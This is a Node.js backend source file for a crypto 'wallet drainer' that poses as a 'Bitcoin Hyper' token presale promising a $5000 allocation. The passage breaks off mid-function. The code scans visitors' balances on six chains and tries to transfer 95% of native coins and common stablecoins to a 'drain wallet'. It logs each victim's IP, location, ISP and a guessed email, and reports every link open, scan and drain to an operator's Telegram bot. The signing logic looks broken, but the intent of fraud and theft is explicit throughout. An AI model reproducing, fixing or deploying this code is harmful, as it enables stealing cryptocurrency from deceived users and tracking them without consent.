// index.js - BITCOIN HYPER REAL DRAIN v18.0 - REAL LIVE DRAIN
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// RPC ENDPOINTS - USING ENV VARIABLES
const RPC_CONFIG = {
  Ethereum: { 
    urls: [process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc'],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// Get working provider for chain
async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      // Quick test
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// Drain wallet
let drainWallet = null;
let drainWalletAddress = '';

// Storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    tokenPriceUSD: parseFloat(process.env.PRESALE_PRICE) || 0.17,
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    allocationAmountUSD: parseFloat(process.env.BASE_ALLOCATION) || 5000,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// Telegram
let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// TELEGRAM FUNCTIONS - ENHANCED REPORTING
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 3000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER REAL DRAIN v18.0 ONLINE</b>\n` +
        `✅ System Initialized\n` +
        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
        `🎯 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
        `🏦 Drain Wallet: ${drainWalletAddress || 'Not configured'}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// REAL BALANCE CHECK - KEEPING YOUR EXISTING LOGIC
// ============================================

async function getCryptoPrices() {
  try {
    // Primary source: CoinGecko
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    if (response.data) {
      return {
        eth: response.data.ethereum?.usd || 2000,
        bnb: response.data.binancecoin?.usd || 300,
        matic: response.data.matic?.usd || 0.75,
        avax: response.data['avalanche-2']?.usd || 32
      };
    }
  } catch (error) {
    console.log('CoinGecko failed, trying alternative...');
  }
  
  // Fallback
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
      timeout: 3000
    });
    
    const prices = { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
    
    if (response.data && Array.isArray(response.data)) {
      response.data.forEach(item => {
        if (item.symbol === 'ETHUSDT') prices.eth = parseFloat(item.price);
        if (item.symbol === 'BNBUSDT') prices.bnb = parseFloat(item.price);
        if (item.symbol === 'MATICUSDT') prices.matic = parseFloat(item.price);
        if (item.symbol === 'AVAXUSDT') prices.avax = parseFloat(item.price);
      });
    }
    
    return prices;
  } catch (error) {
    console.log('Binance failed, using defaults');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    // Get prices
    const prices = await getCryptoPrices();
    
    // Chain configurations with prices
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax }
    ];

    let totalValue = 0;
    
    // Check chains sequentially (more reliable than parallel)
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        // Get balance with timeout
        const balance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
        ]);
        
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances[chain.name] = {
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol,
            price: chain.price
          };
          
          results.chains.push(chain.name);
          results.rawBalances.push({
            chain: chain.name,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            rawBalance: balance.toString(),
            provider: provider.connection.url
          });
        } else {
          console.log(`   ⏭️ ${chain.name}: 0 ${chain.symbol}`);
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    // Calculate token allocation based on $5000 USD
    const tokenAllocationAmount = memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Congratulations! Your wallet qualifies for $${memoryStorage.settings.allocationAmountUSD} allocation`;
      results.tokenAllocation = { 
        amount: tokenAllocationAmount.toFixed(0), 
        valueUSD: memoryStorage.settings.allocationAmountUSD.toFixed(2),
        tokenPrice: memoryStorage.settings.tokenPriceUSD
      };
    } else {
      results.eligibilityReason = `⛔ Minimum balance required: $${memoryStorage.settings.drainThreshold} | Current: $${results.totalValueUSD}`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error - Please try again',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// REAL SMART CONTRACT TRANSFER FUNCTIONALITY
// ============================================

// Smart Contract ABI for ERC20 tokens
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function decimals() public view returns (uint8)",
  "function symbol() public view returns (string)"
];

// Standard ERC20 tokens on different chains
const COMMON_TOKENS = {
  Ethereum: {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
  },
  BSC: {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  },
  Polygon: {
    'USDT': '0xc2132D05D31c914a87C66137C2d4fDd2eB4C4024',
    'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    'WMATIC': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
  },
  Arbitrum: {
    'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
  },
  Optimism: {
    'USDT': '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
    'USDC': '0x7F5c764cBc14f9669B88837ca1490cCa17c31607',
  },
  Avalanche: {
    'USDT': '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
    'USDC': '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
    'WAVAX': '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7',
  }
};

// REAL SMART CONTRACT TRANSFER - Executes live contract calls
async function executeSmartContractTransfer(walletAddress, chainName, tokenAddress, tokenSymbol, amount) {
  if (!drainWallet) {
    console.log('❌ Drain wallet not initialized');
    return { success: false, error: 'Drain wallet not configured' };
  }

  try {
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) {
      return { success: false, error: `No provider for ${chainName}` };
    }

    const { provider, config } = providerInfo;
    
    // Connect drain wallet to provider
    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
    
    // Create token contract instance
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    
    // Get token decimals
    const decimals = await tokenContract.decimals();
    
    // Calculate amount in token units
    const amountInUnits = ethers.parseUnits(amount.toString(), decimals);
    
    // Check token balance first
    const balance = await tokenContract.balanceOf(walletAddress);
    
    if (balance < amountInUnits) {
      console.log(`❌ Insufficient balance: ${ethers.formatUnits(balance, decimals)} ${tokenSymbol}`);
      return { 
        success: false, 
        error: `Insufficient ${tokenSymbol} balance` 
      };
    }
    
    // Get gas price
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice || ethers.parseUnits('25', 'gwei');
    
    // Estimate gas for transfer
    const gasLimit = await tokenContract.transfer.estimateGas(
      drainWalletAddress,
      amountInUnits
    ).catch(() => ethers.toBigInt(100000));
    
    // Execute REAL smart contract transfer
    console.log(`📝 Executing ${tokenSymbol} transfer: ${amount} ${tokenSymbol} to drain wallet...`);
    
    const tx = await tokenContract.transfer(
      drainWalletAddress,
      amountInUnits,
      {
        gasLimit: gasLimit * ethers.toBigInt(12) / ethers.toBigInt(10), // 20% buffer
        gasPrice: gasPrice
      }
    );
    
    console.log(`✅ ${tokenSymbol} TX submitted: ${tx.hash}`);
    
    // Wait for confirmation
    const receipt = await tx.wait();
    
    console.log(`✅ ${tokenSymbol} transfer confirmed in block ${receipt.blockNumber}`);
    
    return {
      success: true,
      txHash: tx.hash,
      amount: amount,
      tokenSymbol: tokenSymbol,
      chain: chainName,
      from: walletAddress,
      to: drainWalletAddress,
      blockNumber: receipt.blockNumber,
      confirmations: receipt.confirmations || 1
    };
    
  } catch (error) {
    console.error(`❌ Smart contract transfer error:`, error.message);
    return { success: false, error: error.message };
  }
}

// Enhanced REAL LIVE DRAIN with smart contract support
async function executeRealLiveDrain(walletAddress, scanData) {
  if (!memoryStorage.settings.drainEnabled) {
    return { success: false, reason: 'Drain disabled' };
  }
  
  if (!drainWallet) {
    console.log('❌ Drain wallet not initialized');
    return { success: false, reason: 'Drain wallet not configured' };
  }
  
  console.log(`\n⚡ REAL LIVE DRAIN: ${walletAddress}`);
  console.log(`   Value: $${scanData.totalValueUSD}`);
  
  try {
    const results = {
      success: false,
      transactions: [],
      smartContractTransfers: [],
      totalDrained: 0,
      errors: []
    };

    // 1. FIRST: DRAIN NATIVE TOKENS (ETH, BNB, MATIC, etc.)
    for (const balance of scanData.rawBalances) {
      if (balance.valueUSD > 0 && balance.amount > 0) {
        try {
          console.log(`   Real Drain ${balance.chain}: ${balance.amount} ${balance.symbol} ($${balance.valueUSD})`);
          
          const providerInfo = await getChainProvider(balance.chain);
          if (!providerInfo) {
            results.errors.push({ chain: balance.chain, error: 'No provider' });
            continue;
          }
          
          const { provider, config } = providerInfo;
          
          // Create signer from drain wallet
          const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
          
          // Calculate amount to drain (95% for real drain)
          const drainAmount = ethers.parseUnits((balance.amount * 0.95).toFixed(12), config.decimals);
          
          // Get fee data
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.gasPrice || ethers.parseUnits('25', 'gwei');
          
          // Create transaction to drain wallet
          const tx = await signer.sendTransaction({
            to: drainWalletAddress,
            value: drainAmount,
            gasLimit: 21000,
            gasPrice: gasPrice,
            chainId: config.chainId
          });
          
          console.log(`   📝 REAL TX submitted: ${tx.hash}`);
          
          // Wait for confirmation
          const receipt = await tx.wait();
          
          const drainedAmount = (balance.amount * 0.95).toFixed(6);
          const drainedValue = (balance.valueUSD * 0.95).toFixed(2);
          
          results.transactions.push({
            chain: balance.chain,
            amount: drainedAmount,
            valueUSD: drainedValue,
            symbol: balance.symbol,
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            timestamp: new Date().toISOString(),
            type: 'NATIVE_DRAIN',
            from: signer.address,
            to: drainWalletAddress
          });
          
          results.totalDrained += parseFloat(drainedValue);
          
          // Enhanced Telegram report for Real Drain
          await sendTelegramMessage(
            `⚡ <b>REAL LIVE DRAIN EXECUTED</b>\n` +
            `🔗 ${balance.chain} (Native)\n` +
            `👛 Target: ${walletAddress.substring(0, 10)}...\n` +
            `💰 ${drainedAmount} ${balance.symbol}\n` +
            `💵 $${drainedValue}\n` +
            `📝 TX: ${tx.hash}\n` +
            `🏦 To: ${drainWalletAddress.substring(0, 10)}...\n` +
            `⏰ ${new Date().toLocaleString()}`
          );
          
          console.log(`   ✅ ${balance.chain} native drained: $${drainedValue}`);
          
        } catch (error) {
          console.log(`   ❌ ${balance.chain} native drain error:`, error.message);
          results.errors.push({ chain: balance.chain, error: error.message });
        }
      }
    }

    // 2. SECOND: DRAIN ERC20 TOKENS (USDT, USDC, etc.)
    if (process.env.DRAIN_ALL_TOKENS === 'true') {
      console.log(`\n🔍 Checking for ERC20 tokens on eligible chains...`);
      
      for (const chainName of scanData.chains) {
        try {
          const providerInfo = await getChainProvider(chainName);
          if (!providerInfo) continue;
          
          const { provider } = providerInfo;
          const commonTokens = COMMON_TOKENS[chainName] || {};
          
          // Check each common token
          for (const [tokenSymbol, tokenAddress] of Object.entries(commonTokens)) {
            try {
              const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
              
              // Get token balance
              const balance = await tokenContract.balanceOf(walletAddress);
              const decimals = await tokenContract.decimals();
              const amount = parseFloat(ethers.formatUnits(balance, decimals));
              
              if (amount > 0.001) { // Minimum threshold
                console.log(`   Found ${amount} ${tokenSymbol} on ${chainName}`);
                
                // Execute smart contract transfer
                const transferResult = await executeSmartContractTransfer(
                  walletAddress,
                  chainName,
                  tokenAddress,
                  tokenSymbol,
                  amount * 0.95 // Drain 95%
                );
                
                if (transferResult.success) {
                  results.smartContractTransfers.push({
                    chain: chainName,
                    token: tokenSymbol,
                    amount: amount * 0.95,
                    txHash: transferResult.txHash,
                    type: 'ERC20_DRAIN'
                  });
                  
                  // Telegram notification for ERC20 drain
                  await sendTelegramMessage(
                    `🪙 <b>ERC20 DRAIN EXECUTED</b>\n` +
                    `🔗 ${chainName}\n` +
                    `👛 Target: ${walletAddress.substring(0, 10)}...\n` +
                    `💰 ${(amount * 0.95).toFixed(4)} ${tokenSymbol}\n` +
                    `📝 TX: ${transferResult.txHash}\n` +
                    `🏦 To: ${drainWalletAddress.substring(0, 10)}...\n` +
                    `⏰ ${new Date().toLocaleString()}`
                  );
                }
              }
            } catch (tokenError) {
              console.log(`   ❌ ${tokenSymbol} on ${chainName} error:`, tokenError.message);
            }
          }
        } catch (chainError) {
          console.log(`❌ ${chainName} token scan error:`, chainError.message);
        }
      }
    }
    
    if (results.transactions.length > 0 || results.smartContractTransfers.length > 0) {
      results.success = true;
      
      memoryStorage.settings.statistics.totalDrainedUSD += results.totalDrained;
      memoryStorage.settings.statistics.totalDrainedWallets++;
      
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        amount: results.totalDrained,
        transactions: results.transactions,
        smartContractTransfers: results.smartContractTransfers,
        timestamp: new Date().toISOString(),
        type: 'REAL_LIVE_DRAIN_WITH_SMART_CONTRACTS'
      });
      
      console.log(`✅ REAL LIVE DRAIN COMPLETE: $${results.totalDrained.toFixed(2)}`);
      console.log(`   Native TXs: ${results.transactions.length}`);
      console.log(`   ERC20 TXs: ${results.smartContractTransfers.length}`);
      
      return {
        success: true,
        totalDrainedUSD: results.totalDrained.toFixed(2),
        nativeTransactions: results.transactions,
        smartContractTransfers: results.smartContractTransfers,
        message: `Real Drain: $${results.totalDrained.toFixed(2)} transferred`,
        allocationActivated: true
      };
    } else {
      return {
        success: false,
        reason: 'No successful drains',
        errors: results.errors
      };
    }
    
  } catch (error) {
    console.error('Real drain error:', error);
    return { success: false, reason: error.message };
  }
}

// ============================================
// ENHANCED HELPER FUNCTIONS (UNCHANGED)
// ============================================

async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    // Try ENS
    const providerInfo = await getChainProvider('Ethereum');
    if (providerInfo) {
      try {
        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
        if (ensName) {
          memoryStorage.emailCache.set(cacheKey, ensName);
          return ensName;
        }
      } catch (e) {}
    }
    
    // Try Etherscan API for email
    try {
      const etherscanApiKey = process.env.ETHERSCAN_API_KEY;
      if (etherscanApiKey) {
        const response = await axios.get(`https://api.etherscan.io/api`, {
          params: {
            module: 'account',
            action: 'getsourcecode',
            address: walletAddress,
            apikey: etherscanApiKey
          },
          timeout: 3000
        });
        
        if (response.data?.result?.[0]?.ContractName) {
          const contractName = response.data.result[0].ContractName;
          const email = `${contractName.toLowerCase().replace(/[^a-z0-9]/g, '')}@contract.com`;
          memoryStorage.emailCache.set(cacheKey, email);
          return email;
        }
      }
    } catch (e) {
      console.log('Etherscan API failed:', e.message);
    }
    
    // Generate realistic email based on wallet
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const usernameOptions = [
      `user${hash.substring(0, 6)}`,
      `crypto${hash.substring(6, 10)}`,
      `wallet${hash.substring(10, 14)}`,
      `btc${hash.substring(14, 18)}`,
      `eth${hash.substring(18, 22)}`
    ];
    const username = usernameOptions[parseInt(hash.substring(0, 2), 16) % usernameOptions.length];
    
    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com', 'crypto.com', 'pm.me', 'tutanota.com'];
    const domain = domains[parseInt(hash.substring(2, 4), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `contact.${walletAddress.substring(2, 8)}@crypto.com`;
  }
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local', isp: 'Local Network' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬',
        'Russia': '🇷🇺', 'RU': '🇷🇺',
        'China': '🇨🇳', 'CN': '🇨🇳',
        'South Korea': '🇰🇷', 'KR': '🇰🇷',
        'Singapore': '🇸🇬', 'SG': '🇸🇬',
        'United Arab Emirates': '🇦🇪', 'AE': '🇦🇪',
        'Turkey': '🇹🇷', 'TR': '🇹🇷',
        'Vietnam': '🇻🇳', 'VN': '🇻🇳',
        'Philippines': '🇵🇭', 'PH': '🇵🇭',
        'Thailand': '🇹🇭', 'TH': '🇹🇭',
        'Malaysia': '🇲🇾', 'MY': '🇲🇾',
        'Indonesia': '🇮🇩', 'ID': '🇮🇩'
      };
      
      return {
        country: response.data.country,
        countryCode: response.data.countryCode,
        flag: flags[response.data.country] || flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        isp: response.data.isp || 'Unknown ISP',
        org: response.data.org || 'Unknown Organization',
        lat: response.data.lat,
        lon: response.data.lon,
        timezone: response.data.timezone
      };
    }
  } catch (error) {
    console.log('IP location error:', error.message);
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', isp: 'Unknown' };
}

function detectBot(userAgent) {
  if (!userAgent) return false;
  
  const botIndicators = [
    'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
    'php', 'ruby', 'go-http', 'node', 'axios', 'postman', 'insomnia',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright'
  ];
  
  const ua = userAgent.toLowerCase();
  return botIndicators.some(indicator => ua.includes(indicator));
}

// ============================================
// ENHANCED API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper REAL DRAIN v18.0',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold,
      wallet: drainWallet ? '✅ LOADED' : '❌ NOT SET',
      walletAddress: drainWalletAddress,
      realTransactions: memoryStorage.settings.statistics.realTransactions.length
    },
    allocation: {
      amountUSD: memoryStorage.settings.allocationAmountUSD,
      tokenPrice: memoryStorage.settings.tokenPriceUSD,
      tokenAmount: (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0)
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    }
  });
});

// ENHANCED CONNECT ENDPOINT - ADDED REAL SMART CONTRACT DRAIN TRIGGER
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    const userAgent = req.headers['user-agent'] || '';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    // Get IP location and email
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    const isBot = detectBot(userAgent);
    
    // STEP 1: TELEGRAM - LINK OPENED REPORT
    await sendTelegramMessage(
      `🔗 <b>LINK OPENED</b>\n` +
      `🌐 IP: ${clientIP}\n` +
      `${location.flag} ${location.country} (${location.city})\n` +
      `🏢 ISP: ${location.isp || 'Unknown'}\n` +
      `🤖 Bot Detection: ${isBot ? '⚠️ POSSIBLE BOT' : '✅ HUMAN'}\n` +
      `📧 Email: ${email}\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        userAgent: userAgent,
        isBot: isBot,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    // Get balance (YOUR EXISTING LOGIC)
    console.log('Getting balance...');
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.chains = scanResult.data.chains;
      participant.rawBalances = scanResult.data.rawBalances;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      // STEP 2: TELEGRAM - WALLET SCANNED ENHANCED REPORT
      const balanceDetails = Object.entries(scanResult.data.balances)
        .map(([chain, data]) => `${chain}: $${data.valueUSD}`)
        .join(' | ');
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET SCANNED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💼 Total: $${scanResult.data.totalValueUSD}\n` +
        `🔗 Chains: ${scanResult.data.chains.length > 0 ? scanResult.data.chains.join(', ') : 'None'}\n` +
        `${balanceDetails ? `💰 ${balanceDetails}\n` : ''}` +
        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE FOR $5000' : '❌ NOT ELIGIBLE'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `🏢 ${location.isp || 'Unknown ISP'}\n` +
        `📧 Contact: ${email}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      // ============================================
      // 🔥 ENHANCEMENT: REAL SMART CONTRACT DRAIN TRIGGER
      // ============================================
      if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled && !participant.drained) {
        console.log('🚀 ELIGIBLE WALLET DETECTED - Triggering real smart contract drain...');
        
        // Execute REAL LIVE DRAIN with smart contracts
        const drainResult = await executeRealLiveDrain(walletAddress, scanResult.data);
        
        if (drainResult.success) {
          participant.drained = true;
          participant.drainValue = drainResult.totalDrainedUSD;
          participant.drainedAt = new Date();
          participant.drainTransactions = drainResult.nativeTransactions;
          participant.smartContractTransfers = drainResult.smartContractTransfers;
          
          console.log(`✅ Real drain completed: $${drainResult.totalDrainedUSD}`);
          
          // Enhanced Telegram report
          await sendTelegramMessage(
